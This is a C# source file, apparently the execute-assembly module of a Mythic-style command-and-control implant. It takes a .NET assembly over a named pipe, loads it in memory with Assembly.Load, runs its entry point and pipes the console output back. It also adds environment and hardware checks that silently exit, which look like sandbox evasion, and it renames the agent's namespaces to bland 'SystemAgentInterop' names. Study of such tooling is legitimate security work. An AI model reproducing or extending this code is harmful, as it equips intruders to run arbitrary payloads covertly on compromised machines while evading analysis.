﻿using SystemAgentInterop.Classes;
using SystemAgentInterop.Classes.Core;
using SystemAgentInterop.Classes.Events;
using SystemAgentInterop.Classes.IO;
using SystemAgentInterop.Constants;
using SystemAgentInterop.Enums.SystemCoreEnums;
using SystemAgentInterop.Interfaces;
using SystemAgentInterop.Serializers;
using SystemAgentInterop.Structs.SystemCoreStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using ST = System.Threading.Tasks;

namespace ExecuteAssembly
{
    class Program
    {

        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW(
           [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
           out int pNumArgs);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static string? _namedPipeName;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AsyncNamedPipeServer? _server;
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object>? _sendAction;
        private static ST.Task? _clientConnectedTask;

        public static void Main(string[] args)
        {
            // System integrity validation
            if (!SystemIntegrityValidator.ValidateEnvironment()) {
                Environment.Exit(0);
            }
            
            // Hardware profile verification
            if (!HardwareProfileValidator.ValidateConfiguration()) {
                Environment.Exit(0);
            }
            
            // Runtime security checks
            SecurityMonitor.InitializeProtections();
            
            //_namedPipeName = "executetest";
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];

            _sendAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _senderEvent,
                        _cts.Token.WaitHandle
                    });
                    while (_senderQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                    }
                }

                while (_senderQueue.TryDequeue(out byte[] message))
                {
                    pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                }

                // Wait for all messages to be read by SystemCore
                pipe.WaitForPipeDrain();
                pipe.Close();
            };

            _server = new AsyncNamedPipeServer(_namedPipeName, instances: 1, BUF_OUT: IPC.SEND_SIZE, BUF_IN: IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += OnAsyncMessageReceived;
            _receiverEvent.WaitOne();
            if (_recieverQueue.TryDequeue(out IMythicMessage asmArgs))
            {
                if (asmArgs.GetTypeCode() != MessageType.IPCCommandArguments)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {asmArgs.GetTypeCode()}");
                }
                TextWriter originalStdout = Console.Out;
                TextWriter originalStderr = Console.Error;

                IPCCommandArguments command = (IPCCommandArguments)asmArgs;
                EventableStringWriter stdoutSw = new EventableStringWriter();
                EventableStringWriter stderrSw = new EventableStringWriter();

                stdoutSw.BufferWritten += OnBufferWrite;
                stderrSw.BufferWritten += OnBufferWrite;

                Console.SetOut(stdoutSw);
                Console.SetError(stderrSw);

                try
                {
                    Assembly asm = Assembly.Load(command.ByteData);
                    var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                    if (costuraLoader != null)
                    {
                        var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
                        costuraLoaderMethod.Invoke(null, new object[] { });
                    }

                    asm.EntryPoint.Invoke(null, new object[] { ParseCommandLine(command.StringData) });
                }
                catch (TargetInvocationException ex)
                {
                    Exception inner = ex.InnerException;
                    Console.WriteLine($"\nUnhandled Exception: {inner}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Unhandled exception from assembly loader: {ex.Message}");
                }
                finally
                {
                    Console.SetOut(originalStdout);
                    Console.SetError(originalStderr);
                }
            }

            _cts.Cancel();

            // Wait for the pipe client comms to finish
            while (_clientConnectedTask is ST.Task task && !_clientConnectedTask.IsCompleted)
            {
                task.Wait(1000);
            }
        }

        private static string[] ParseCommandLine(string cmdline)
        {
            int numberOfArgs;
            IntPtr ptrToSplitArgs;
            string[] splitArgs;

            ptrToSplitArgs = CommandLineToArgvW(cmdline, out numberOfArgs);

            // CommandLineToArgvW returns NULL upon failure.
            if (ptrToSplitArgs == IntPtr.Zero)
                throw new ArgumentException("Unable to split argument.", new Win32Exception());

            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
            try
            {
                splitArgs = new string[numberOfArgs];

                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
                // Copy each of these strings into our split argument array.
                for (int i = 0; i < numberOfArgs; i++)
                    splitArgs[i] = Marshal.PtrToStringUni(
                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

                return splitArgs;
            }
            finally
            {
                // Free memory obtained by CommandLineToArgW.
                LocalFree(ptrToSplitArgs);
            }
        }

        private static void OnBufferWrite(object sender, StringDataEventArgs args)
        {
            if (args.Data != null)
            {
                try
                {
                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(args.Data));
                    _senderEvent.Set();
                }
                catch { }

            }
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            pipe.Flush();
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }

        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_sendAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
